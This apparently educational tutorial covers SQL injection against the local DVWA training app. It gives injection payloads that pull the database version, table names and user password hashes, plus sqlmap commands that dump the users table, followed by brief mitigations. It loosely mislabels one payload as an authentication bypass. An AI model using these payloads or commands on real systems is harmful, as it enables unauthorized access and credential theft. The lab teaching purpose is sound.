# **Exploiting SQL Injection on DVWA (Low Level) Manually & Using SQLmap**  

In this guide, we will perform **SQL Injection (SQLi) exploitation** on **Damn Vulnerable Web Application (DVWA)** with security set to **Low**.  

We will cover **both manual exploitation and automation using SQLmap**.

---

## **1. Setting Up DVWA**  
Before attacking, make sure **DVWA is running** on your system.

### **1.1 Start Services**  
If you're using **Kali Linux**, start Apache and MySQL:  
```bash
sudo systemctl start apache2
sudo systemctl start mysql
```

### **1.2 Log into DVWA**  
1. Open your browser and go to:  
   ```
   http://localhost/dvwa/
   ```
2. Use default credentials:  
   ```
   Username: admin  
   Password: password
   ```
3. Set **Security Level to Low**:  
   - Navigate to **DVWA Security**  
   - Change **Security Level** to **Low**  
   - Click **Submit**  

---

## **2. Manual SQL Injection Exploitation**
We'll manually test **SQL Injection on the User ID field**.

### **2.1 Identifying a Vulnerability**
1. Go to **SQL Injection page**:  
   ```
   http://localhost/dvwa/vulnerabilities/sqli/
   ```
2. Enter a **single quote (`'`)** in the input box and click **Submit**.  

   **Example Input:**  
   ```
   '
   ```
   If you see an error like:  
   ```
   You have an error in your SQL syntax
   ```
   ✅ **The application is vulnerable to SQL injection.**

---

### **2.2 Bypassing Authentication**  
Now, let's **bypass authentication** using SQL injection.  

1. Enter the following payload in the **User ID** field:  
   ```
   1' OR 1=1 --  
   ```
2. Click **Submit**.  

   **Explanation:**  
   - `1' OR 1=1 --` **always evaluates to TRUE**, returning all users.  
   - The `--` **comments out the rest of the SQL query**.  

---

### **2.3 Extracting Database Version**
Enter the following payload in **User ID**:  
```sql
1' UNION SELECT null, @@version --  
```
✅ This will **return the database version**.

---

### **2.4 Listing All Database Tables**
Use:  
```sql
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --  
```
✅ **Returns table names** in the current database.

---

### **2.5 Extracting User Credentials**
Use:  
```sql
1' UNION SELECT null, concat(user, ':', password) FROM users --  
```
✅ **Extracts usernames and passwords.**

---

## **3. Automating SQL Injection Using SQLmap**
Now, let's use **SQLmap** to automate the attack.

### **3.1 Capture Request Data**
1. Open **DVWA's SQL Injection page**.  
2. **Intercept the request** using **Burp Suite** or browser developer tools.  
3. Identify the vulnerable URL:  
   ```
   http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
   ```

---

### **3.2 Enumerating Databases**
Run SQLmap:  
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" --dbs
```
✅ **Lists all databases**.

---

### **3.3 Extracting Tables**
Find tables in `dvwa`:  
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" -D dvwa --tables
```
✅ **Lists table names**.

---

### **3.4 Extracting Columns from `users` Table**
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" -D dvwa -T users --columns
```
✅ **Lists column names**.

---

### **3.5 Dumping Usernames & Passwords**
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" -D dvwa -T users --dump
```
✅ **Extracts all user credentials.**

---

## **4. Preventing SQL Injection**  
To **mitigate SQLi vulnerabilities**:  
✅ Use **Prepared Statements**  
✅ Sanitize user input  
✅ Apply **least privilege** to database users  
✅ Enable **Web Application Firewalls (WAF)**  
